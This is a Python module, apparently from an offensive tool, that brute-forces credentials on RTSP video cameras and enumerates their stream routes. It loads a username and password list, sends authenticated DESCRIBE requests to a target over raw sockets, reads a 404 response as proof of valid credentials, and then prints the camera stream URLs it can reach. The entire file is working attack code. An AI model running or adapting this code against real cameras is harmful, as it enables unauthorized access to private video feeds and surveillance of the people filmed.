import socket, os, json
from . import attack_routes as ar
from . import auth_helper as ah
from colorama import init
from termcolor import colored

init()

def attackRoutesWithCreds(target, username, password, port, authmethod):
    try:
        foundStreams = [] # List of found streams for current target:port
        warnMass200 = dict() # Dict used as a counter
        warnMass200[target] = 0 # that will increase itself by 1 for each stream found

        for route in ar.routeBuilder(username, password):
            if warnMass200[target] > 20: # If there are more than 20 found streams for the current target
                print(colored('[-] Ending detection for {} due to mass 200 response codes.'.format(target), 'red'))
                print(colored('[+] Try using: rtsp://{}:{}@{}:{}/'.format(username, password, target, port), 'green'))
                print(colored("-" * 40, 'cyan'))
                break # Break - something's wrong (the target responds with status 200 too many times)

            recBuffer = "" # Used later with DIGEST auth
            seq = 1 # Starting RTSP sequence number

            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target,port))

            if authmethod == "digest":
                # The next line might be wrong - we are trying without user/pass combo for now
                describeURL = "rtsp://{}:{}/{}".format(target, port, route)
                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                recBuffer = s.recv(ah.configJson["bufLen"]).decode() # Buffer used in the next request, if DIGEST
                seq += 1 # Increasing sequence number - for the next request
            else:
                # If not DIGEST, we append user:pass@ to the descibe URL
                describeURL = "rtsp://{}:{}@{}:{}/{}".format(username, password, target, port, route)

            # Describing the URL
            s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, recBuffer, username, password, "/{}".format(route))))
            finalBuffer = s.recv(ah.configJson["bufLen"]).decode() # Getting the final response
            seq += 1 # Increasing sequence (everytime after a socket send)

            if "RTSP/1.0 200" in finalBuffer: # If we get 200, we found a route accessible with current user/pass
                warnMass200[target] += 1 # Increase the warning counter of the current target
                foundStreams.append("rtsp://{}:{}@{}:{}/{}".format(username, password, target, port, route))
        
        # When route-cycle is finished, if our warning counter is "normal"
        if warnMass200[target] <= 20 and warnMass200[target] > 0:
            for stream in foundStreams: # Print found streams from the list
                print(colored("[+] Found Stream: {}".format(stream), 'green'))
    except:
        pass

def attackCredentials(target, port, authmethod):
    try:
        recBuffer = "" # Used in DIGEST, otherwise it is ignored by the auth-helper lib
        finalBuffer = "" # Used to check the response status codes
        seq = 1 # Starting sequence before each new connection

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target,port))

        # We start with an invalid URI, to avoid hitting continous 200's
        describeURL = "rtsp://{}:{}{}".format(target, port, "/sdekfjvhejkhrv")

        # Loading the credentials
        with open(os.path.join(os.path.dirname(__file__), 'resources\\creds.json'), 'r') as f:
            userpasslist = json.load(f)

        # Combining credentials in a loop
        for username in userpasslist['usernames']:
            for password in userpasslist['passwords']:
                if authmethod == "digest": # If auth method is DIGEST
                    # We have to DESCRIBE blindly first, to get nonce and realm
                    s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ""))
                    recBuffer = s.recv(ah.configJson["bufLen"]).decode()
                    seq += 1 # Increasing the sequence

                # Trying to describe the route (recBuffer will be ignored, if it's a BASIC auth target)
                s.send(ah.genDESCRIBE(describeURL,seq,ah.configJson["clUagent"], ah.authBuilder(authmethod, recBuffer, username, password, "/sdekfjvhejkhrv")))
                finalBuffer = s.recv(ah.configJson["bufLen"]).decode()
                seq += 1 # Increasing seq again

                if "RTSP/1.0 404" in finalBuffer: # If we get a 404, we found its credentials
                    print(colored("[+] Attacking routes at {}:{} with valid username '{}' and password '{}' ({})...".format(target, port, username, password, authmethod), 'cyan'))
                    attackRoutesWithCreds(target, username, password, port, authmethod)
    except:
        pass